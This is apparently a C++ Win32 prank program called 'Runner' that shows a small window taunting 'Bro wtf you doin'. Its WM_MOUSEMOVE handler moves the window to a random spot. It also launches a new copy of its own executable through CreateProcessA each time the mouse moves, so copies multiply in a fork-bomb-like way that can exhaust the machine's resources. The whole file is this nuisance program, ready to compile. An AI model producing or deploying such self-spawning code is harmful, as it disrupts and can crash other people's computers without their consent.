#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <iostream>

// The main window class name.
static TCHAR szWindowClass[] = _T("Runner");

// The string that appears in the application's title bar.
static TCHAR szTitle[] = _T("Runner Window");

// Stored instance handle for use in Win32 API calls such as FindResource
HINSTANCE hInst;

STARTUPINFOA si;
PROCESS_INFORMATION pi;

// Forward declarations of functions included in this code module:
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

int maxX = 0;
int maxY = 0;
LPCSTR path;

void DesktopRes(int& horizontal, int& vertical)
{
    RECT desktop;

    const HWND hDesktop = GetDesktopWindow();

    GetWindowRect(hDesktop, &desktop);

    horizontal = desktop.right - 250;
    vertical = desktop.bottom - 250;
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR     lpCmdLine,
    _In_ int       nCmdShow
)
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
    path = buffer;

    WNDCLASSEX wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(wcex.hInstance, IDI_APPLICATION);
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;   
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, IDI_APPLICATION);

    if (!RegisterClassEx(&wcex))
        return 1;

    // Store instance handle in our global variable
    hInst = hInstance;

    srand(time(NULL));
    int x = rand() % 500;
    int y = rand() % 500;

    HWND hWnd = CreateWindowEx(
        WS_EX_OVERLAPPEDWINDOW,
        szWindowClass,
        szTitle,
        WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME,
        x, y,
        100, 100,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (!hWnd)
        return 1;

    // The parameters to ShowWindow explained:
    // hWnd: the value returned from CreateWindow
    // nCmdShow: the fourth parameter from WinMain
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
    DesktopRes(maxX, maxY);

    // Main message loop:
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}

//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    PAINTSTRUCT ps;
    HDC hdc;
    HMENU hmenu = GetSystemMenu(hWnd, FALSE);

    TCHAR greeting[] = _T("Bro wtf you doin");
    switch (message)
    {
    case WM_PAINT:
        hdc = BeginPaint(hWnd, &ps);
        //EnableMenuItem(hmenu, SC_CLOSE, MF_GRAYED);
        SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) & ~WS_BORDER);

        // Here your application is laid out.
        // For this introduction, we just print out "Hello, Windows desktop!"
        // in the top left corner.
        TextOut(hdc, 5, 5, greeting, _tcslen(greeting));
        // End application-specific layout section.

        EndPaint(hWnd, &ps);
        break;
    case WM_CLOSE:
        PostQuitMessage(1);
        break;

    case WM_MOUSEMOVE:
        MoveWindow(hWnd, rand() % maxX, rand() % maxY, rand() % 500, rand() % 300, TRUE);
        CreateProcessA(path, __argv[1], NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        break;

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
        break;
    }

    return 0;
}